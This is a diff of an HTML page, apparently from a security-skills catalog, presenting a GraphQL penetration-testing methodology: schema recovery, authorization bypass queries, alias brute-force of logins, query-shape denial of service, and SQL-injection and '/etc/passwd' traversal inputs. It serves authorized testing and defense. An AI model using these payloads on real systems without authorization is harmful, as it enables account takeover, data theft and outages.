@@ -5,11 +5,20 @@
     h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
     .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
     .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
-    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    .inst{position:relative;margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
     padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
     .inst .p{color:var(--faint);user-select:none}
-    article{padding:44px 0 72px;border-top:1px solid var(--border)}
-    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    .slayout{display:grid;grid-template-columns:minmax(0,1fr) 214px;gap:52px;align-items:start;
+    padding:40px 0 40px;border-top:1px solid var(--border)}
+    .toc{position:sticky;top:76px}
+    .toc .tl{font-family:var(--mono);font-size:11px;color:var(--faint);margin-bottom:11px}
+    .toc a{display:block;color:var(--muted);font-size:12.5px;line-height:1.35;padding:5px 0 5px 14px;
+    border-left:1px solid var(--border);margin-left:-1px}
+    .toc a:hover{color:var(--text);text-decoration:none;border-color:var(--border2)}
+    .toc a.on{color:var(--text);border-color:var(--accent)}
+    article{min-width:0}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px;scroll-margin-top:76px}
+    article h2:first-child{margin-top:0}
     article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
     article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
     article p{margin:0 0 15px;max-width:74ch}
@@ -17,13 +26,15 @@
     article li{margin:5px 0}article li>ul{margin:5px 0}
     article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
     article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    .codeblk{position:relative;margin:0 0 18px}
     article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
-    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    padding:15px 16px;overflow-x:auto;margin:0;max-width:100%}
     article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
     article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
     .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
     article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
     article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    @media (max-width:820px){.slayout{grid-template-columns:1fr;gap:0}.toc{display:none}}
     </style></head><body>
 <div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
 <nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
@@ -36,11 +47,12 @@
     <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
   </div>
   <p class="sdesc">Test GraphQL APIs — introspection and schema recovery when introspection is disabled, field suggestion abuse, batching and alias-based rate limit bypass, query depth and complexity denial of service, authorization gaps per field and per resolver, and mutation abuse. Use when a target exposes /graphql, /v1/graphql, or /api/graphql, when requests contain a query or mutation body, or when responses carry a data and errors envelope.</p>
-  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+  <div class="inst cx"><button class="copy" data-copy="/plugin install secskills-offense
+/plugin install secskills-core">copy</button><span class="p">$ </span>/plugin install secskills-offense
 <span class="p">$ </span>/plugin install secskills-core</div>
 </div></header>
-<article><div class="wrap"><p>GraphQL moves authorization from routes to resolvers, and most teams do not move their access control with it. The REST habit of protecting <code>/admin/*</code> has no equivalent when every operation arrives at one endpoint — so the recurring finding is not an exotic GraphQL bug, it is an ordinary authorization failure on a field nobody thought to guard.</p>
-<h2>When to Use</h2>
+<div class="wrap slayout"><article><p>GraphQL moves authorization from routes to resolvers, and most teams do not move their access control with it. The REST habit of protecting <code>/admin/*</code> has no equivalent when every operation arrives at one endpoint — so the recurring finding is not an exotic GraphQL bug, it is an ordinary authorization failure on a field nobody thought to guard.</p>
+<h2 id="when-to-use">When to Use</h2>
 <ul>
 <li>The target exposes <code>/graphql</code>, <code>/graphiql</code>, <code>/v1/graphql</code>, <code>/api/graphql</code></li>
 <li>Request bodies contain <code>query</code>, <code>mutation</code>, <code>subscription</code>, or <code>operationName</code></li>
@@ -48,7 +60,7 @@
 <li>A mobile or SPA client posts GraphQL to a backend</li>
 <li>You need to map an API whose schema you do not have</li>
 </ul>
-<h2>When NOT to Use</h2>
+<h2 id="when-not-to-use">When NOT to Use</h2>
 <ul>
 <li><strong>REST or gRPC</strong> — use <a class="xref" href="testing-apis.html"><code>testing-apis</code></a> or <a class="xref" href="attacking-grpc-protobuf.html"><code>attacking-grpc-protobuf</code></a></li>
 <li><strong>Source code available</strong> — use <a class="xref" href="auditing-code-for-vulnerabilities.html"><code>auditing-code-for-vulnerabilities</code></a>; read the</li>
@@ -59,24 +71,44 @@
 <li><strong>Building a denial-of-service against production</strong> — model the risk, prove it</li>
 </ul>
 <p>minimally, and get explicit authorization before any load</p>
-<h2>Recover the Schema</h2>
-<pre><code># Standard introspection
+<h2 id="recover-the-schema">Recover the Schema</h2>
+<div class="codeblk cx"><button class="copy" data-copy="# Standard introspection
+curl -s https://target/graphql -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;query&quot;:&quot;query{__schema{types{name fields{name args{name type{name}}}}}}&quot;}&#x27; | jq .
+
+# Tooling that renders it usefully
+graphql-cop -t https://target/graphql
+clairvoyance https://target/graphql -o schema.json     # works WITHOUT introspection
+graphw00f -t https://target/graphql                    # fingerprint the engine">copy</button><pre><code># Standard introspection
 curl -s https://target/graphql -H 'Content-Type: application/json' \
   -d '{"query":"query{__schema{types{name fields{name args{name type{name}}}}}}"}' | jq .
 
 # Tooling that renders it usefully
 graphql-cop -t https://target/graphql
 clairvoyance https://target/graphql -o schema.json     # works WITHOUT introspection
-graphw00f -t https://target/graphql                    # fingerprint the engine</code></pre>
+graphw00f -t https://target/graphql                    # fingerprint the engine</code></pre></div>
 <p><strong>When introspection is disabled, the schema is usually still recoverable.</strong> Most engines return "did you mean" suggestions on a misspelled field, which leaks valid names one character class at a time. <code>clairvoyance</code> automates exactly this.</p>
-<pre><code># Field suggestion leak — the response names fields you did not know
+<div class="codeblk cx"><button class="copy" data-copy="# Field suggestion leak — the response names fields you did not know
+curl -s https://target/graphql -d &#x27;{&quot;query&quot;:&quot;{ userr { id } }&quot;}&#x27; -H &#x27;Content-Type: application/json&#x27;
+# → &quot;Cannot query field \&quot;userr\&quot; on type \&quot;Query\&quot;. Did you mean \&quot;user\&quot;?&quot;">copy</button><pre><code># Field suggestion leak — the response names fields you did not know
 curl -s https://target/graphql -d '{"query":"{ userr { id } }"}' -H 'Content-Type: application/json'
-# → "Cannot query field \"userr\" on type \"Query\". Did you mean \"user\"?"</code></pre>
+# → "Cannot query field \"userr\" on type \"Query\". Did you mean \"user\"?"</code></pre></div>
 <p>Other schema sources: the client bundle (queries are usually inlined in the JS), a <code>.graphql</code> file served by mistake, persisted-query manifests, and Apollo Studio or similar tooling left public.</p>
 <p><strong>Fingerprint the engine</strong> — behaviour differs materially. Apollo, graphql-js, Hasura, graphene, gqlgen, and HotChocolate each have distinct defaults for batching, suggestions, depth limits, and error verbosity. <code>graphw00f</code> names it.</p>
-<h2>Authorization Is the Main Event</h2>
+<h2 id="authorization-is-the-main-event">Authorization Is the Main Event</h2>
 <p>Test authorization <strong>per field and per resolver</strong>, not per endpoint. A schema where <code>user(id:)</code> is guarded but <code>user { organization { members { email } } }</code> is not is the standard finding.</p>
-<pre><code># 1. Object-level: request another tenant's or user's object by ID
+<div class="codeblk cx"><button class="copy" data-copy="# 1. Object-level: request another tenant&#x27;s or user&#x27;s object by ID
+query { user(id: &quot;other-user-id&quot;) { id email phone } }
+
+# 2. Field-level: the object is yours, but a field should not be exposed
+query { me { id email passwordHash internalNotes stripeCustomerId } }
+
+# 3. Traversal: reach a protected object through an unguarded edge
+query { post(id: 1) { author { email resetToken orders { total } } } }
+
+# 4. Mutations: the usual suspects, called directly
+mutation { updateUser(id: &quot;other&quot;, input: {role: ADMIN}) { id role } }
+mutation { deleteAccount(id: &quot;other&quot;) { success } }">copy</button><pre><code># 1. Object-level: request another tenant's or user's object by ID
 query { user(id: "other-user-id") { id email phone } }
 
 # 2. Field-level: the object is yours, but a field should not be exposed
@@ -87,38 +119,54 @@ query { post(id: 1) { author { email resetToken orders { total } } } }
 
 # 4. Mutations: the usual suspects, called directly
 mutation { updateUser(id: "other", input: {role: ADMIN}) { id role } }
-mutation { deleteAccount(id: "other") { success } }</code></pre>
+mutation { deleteAccount(id: "other") { success } }</code></pre></div>
 <p><strong>Traversal through relationships is the highest-yield test.</strong> Developers guard the entry points they think about; nested edges inherit whatever the parent resolver allowed, and often that is nothing. Enumerate the schema's edges and walk from any object you legitimately own toward objects you do not.</p>
 <p>Repeat every test at each privilege level you have: anonymous, low-privilege user, and a second tenant's user.</p>
-<h2>Batching and Alias Abuse</h2>
+<h2 id="batching-and-alias-abuse">Batching and Alias Abuse</h2>
 <p>One HTTP request can carry many operations, which defeats per-request rate limiting — the classic 2FA and password brute-force bypass.</p>
-<pre><code># Aliases: N attempts, one request
+<div class="codeblk cx"><button class="copy" data-copy="# Aliases: N attempts, one request
+{
+  a1: login(user:&quot;admin&quot;, pass:&quot;1234&quot;) { token }
+  a2: login(user:&quot;admin&quot;, pass:&quot;1235&quot;) { token }
+  a3: login(user:&quot;admin&quot;, pass:&quot;1236&quot;) { token }
+}">copy</button><pre><code># Aliases: N attempts, one request
 {
   a1: login(user:"admin", pass:"1234") { token }
   a2: login(user:"admin", pass:"1235") { token }
   a3: login(user:"admin", pass:"1236") { token }
-}</code></pre>
-<pre><code>[ {"query":"{ user(id:1){email} }"},
+}</code></pre></div>
+<div class="codeblk cx"><button class="copy" data-copy="[ {&quot;query&quot;:&quot;{ user(id:1){email} }&quot;},
+  {&quot;query&quot;:&quot;{ user(id:2){email} }&quot;},
+  {&quot;query&quot;:&quot;{ user(id:3){email} }&quot;} ]">copy</button><pre><code>[ {"query":"{ user(id:1){email} }"},
   {"query":"{ user(id:2){email} }"},
-  {"query":"{ user(id:3){email} }"} ]</code></pre>
+  {"query":"{ user(id:3){email} }"} ]</code></pre></div>
 <p>Array batching is supported by default in several engines. Test both forms; they are often limited differently, and rate limiting applied at the HTTP layer sees one request either way.</p>
-<h2>Denial of Service by Query Shape</h2>
-<pre><code># Depth: cyclic relationships nested repeatedly
+<h2 id="denial-of-service-by-query-shape">Denial of Service by Query Shape</h2>
+<div class="codeblk cx"><button class="copy" data-copy="# Depth: cyclic relationships nested repeatedly
+{ user { posts { author { posts { author { posts { id } } } } } } }
+
+# Breadth: aliases multiply one expensive resolver
+{ a: search(q:&quot;x&quot;){id} b: search(q:&quot;x&quot;){id} c: search(q:&quot;x&quot;){id} ... }
+
+# Field duplication amplifies without depth
+{ user { id id id id id id ... } }">copy</button><pre><code># Depth: cyclic relationships nested repeatedly
 { user { posts { author { posts { author { posts { id } } } } } } }
 
 # Breadth: aliases multiply one expensive resolver
 { a: search(q:"x"){id} b: search(q:"x"){id} c: search(q:"x"){id} ... }
 
 # Field duplication amplifies without depth
-{ user { id id id id id id ... } }</code></pre>
+{ user { id id id id id id ... } }</code></pre></div>
 <p>Check for: a depth limit, a complexity/cost limit, a timeout, a node limit on pagination, and whether the engine batches N+1 resolver calls or issues one query per node. <strong>Prove the risk with a small, bounded query</strong> — measure the response-time gradient across depths rather than actually exhausting the service. A single 8-level query that takes 30 seconds when a 3-level one takes 30 milliseconds is the evidence; you do not need to take the API down.</p>
-<h2>Injection Through Resolvers</h2>
+<h2 id="injection-through-resolvers">Injection Through Resolvers</h2>
 <p>Resolvers reach databases the same as any other handler, so the classic classes apply — with the twist that arguments are strongly typed, which people mistake for validation.</p>
-<pre><code>{ user(filter: "1' OR '1'='1") { id } }                 # SQL/NoSQL injection
+<div class="codeblk cx"><button class="copy" data-copy="{ user(filter: &quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;) { id } }                 # SQL/NoSQL injection
+{ users(where: {email: {_ilike: &quot;%&quot;}}) { email } }       # Hasura-style filter abuse
+{ file(path: &quot;../../etc/passwd&quot;) { contents } }          # traversal">copy</button><pre><code>{ user(filter: "1' OR '1'='1") { id } }                 # SQL/NoSQL injection
 { users(where: {email: {_ilike: "%"}}) { email } }       # Hasura-style filter abuse
-{ file(path: "../../etc/passwd") { contents } }          # traversal</code></pre>
+{ file(path: "../../etc/passwd") { contents } }          # traversal</code></pre></div>
 <p>Hasura and similar auto-generated APIs deserve specific attention: they expose rich <code>where</code> filters directly to the client, so a permissive row-level-security configuration means the filter language itself becomes the vulnerability.</p>
-<h2>Other Checks Worth Running</h2>
+<h2 id="other-checks-worth-running">Other Checks Worth Running</h2>
 <ul>
 <li><strong>CSRF via <code>GET</code> or form-encoded queries.</strong> If the endpoint accepts</li>
 </ul>
@@ -136,7 +184,7 @@ mutation { deleteAccount(id: "other") { success } }</code></pre>
 <ul>
 <li><strong>File uploads</strong> via the multipart spec, which is a separate parser.</li>
 </ul>
-<h2>Rationalizations to Reject</h2>
+<h2 id="rationalizations-to-reject">Rationalizations to Reject</h2>
 <ul>
 <li><em>"Introspection is disabled, so the schema is protected."</em> Suggestions leak</li>
 </ul>
@@ -161,19 +209,22 @@ mutation { deleteAccount(id: "other") { success } }</code></pre>
 <li><em>"Depth limiting is in place."</em> Check breadth and aliases too.</li>
 <li><em>"I'll prove the DoS by taking it down."</em> Prove the gradient. Ask before load.</li>
 </ul>
-<h2>ATT&amp;CK Coverage</h2>
+<h2 id="att-ck-coverage">ATT&amp;CK Coverage</h2>
 <p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
 <p><strong>Initial Access</strong> (TA0001)</p>
 <ul>
 <li><a href="https://attack.mitre.org/techniques/T1190/">T1190</a> Exploit Public-Facing Application — see also <a class="xref" href="testing-web-applications.html"><code>testing-web-applications</code></a>, <a class="xref" href="testing-apis.html"><code>testing-apis</code></a>, <a class="xref" href="enumerating-network-services.html"><code>enumerating-network-services</code></a>, <a class="xref" href="attacking-grpc-protobuf.html"><code>attacking-grpc-protobuf</code></a>, <a class="xref" href="exploiting-deserialization.html"><code>exploiting-deserialization</code></a>, <a class="xref" href="exploiting-ssrf.html"><code>exploiting-ssrf</code></a>, <a class="xref" href="exploiting-xxe.html"><code>exploiting-xxe</code></a></li>
 </ul>
 <p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
-<h2>References</h2>
+<h2 id="references">References</h2>
 <ul>
 <li><a class="xref" href="testing-apis.html"><code>testing-apis</code></a> — the general API methodology this specializes</li>
 <li><a class="xref" href="auditing-code-for-vulnerabilities.html"><code>auditing-code-for-vulnerabilities</code></a> — resolver-level review when source exists</li>
 <li><a class="xref" href="testing-web-applications.html"><code>testing-web-applications</code></a> — the app around the endpoint</li>
 <li><a class="xref" href="reporting-security-findings.html"><code>reporting-security-findings</code></a> — severity for authorization findings</li>
 <li>graphw00f, clairvoyance, graphql-cop, InQL (Burp), Altair/GraphiQL</li>
-</ul></div></article>
-<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
+</ul></article><aside class="toc"><div class="tl">On this page</div><nav><a href="#when-to-use">When to Use</a><a href="#when-not-to-use">When NOT to Use</a><a href="#recover-the-schema">Recover the Schema</a><a href="#authorization-is-the-main-event">Authorization Is the Main Event</a><a href="#batching-and-alias-abuse">Batching and Alias Abuse</a><a href="#denial-of-service-by-query-shape">Denial of Service by Query Shape</a><a href="#injection-through-resolvers">Injection Through Resolvers</a><a href="#other-checks-worth-running">Other Checks Worth Running</a><a href="#rationalizations-to-reject">Rationalizations to Reject</a><a href="#att-ck-coverage">ATT&amp;CK Coverage</a><a href="#references">References</a></nav></aside></div>
+<footer><div class="wrap"><div class="mono">secskills · offense · verified 2026-07-27</div>
+<a class="mono" href="index.html#catalog">← all skills</a></div></footer>
+<script>(function(){var ls=[].slice.call(document.querySelectorAll('.toc a'));if(!ls.length)return;var hs=ls.map(function(a){return document.getElementById(a.getAttribute('href').slice(1));});function on(){var y=scrollY+90,c=0;for(var i=0;i<hs.length;i++){if(hs[i]&&hs[i].offsetTop<=y)c=i;}ls.forEach(function(a,i){a.classList.toggle('on',i===c);});}addEventListener('scroll',on,{passive:true});on();})();</script>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script><script>(function(){var t=document.createElement('div');t.className='toast';t.setAttribute('role','status');document.body.appendChild(t);var tm;function toast(m){t.textContent=m;t.classList.add('on');clearTimeout(tm);tm=setTimeout(function(){t.classList.remove('on')},1500);}document.addEventListener('click',function(e){var b=e.target.closest('[data-copy]');if(!b)return;var x=b.getAttribute('data-copy');navigator.clipboard.writeText(x).then(function(){toast('Copied to clipboard');if(b.classList.contains('copy')||b.classList.contains('copy2')){var o=b.textContent;b.textContent='copied';b.classList.add('ok');setTimeout(function(){b.textContent=o;b.classList.remove('ok')},1400);}},function(){toast('Copy failed');});});})();</script></body></html>
